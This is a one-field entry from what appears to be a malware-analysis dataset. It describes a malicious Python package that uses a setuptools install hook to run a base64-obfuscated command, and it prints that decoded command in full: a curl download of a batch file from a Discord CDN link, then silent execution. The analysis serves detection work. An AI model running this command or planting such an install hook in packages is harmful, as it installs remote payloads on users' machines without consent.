      "malicious_behavior": "This code is malicious. It defines a custom setuptools install command (AfterInstall) that, upon package installation, executes a function (notmalfunc) which runs a base64-decoded shell command via os.system. The decoded command is: 'curl -s -o %temp%\\strings.bat https://cdn.discordapp.com/attachments/1146199124572639249/1188980936969306164/strings.bat && start /min cmd /c %temp%\\strings.bat'. This downloads a batch file from a remote server (Discord CDN) to the user's temp directory and executes it silently. This is a classic supply chain attack pattern: the code is triggered automatically during package installation, uses obfuscation (base64), downloads and executes a remote payload, and provides no user notification or consent. The use of a Discord CDN URL, lack of legitimate business logic, and execution during install are all strong indicators of malware.",
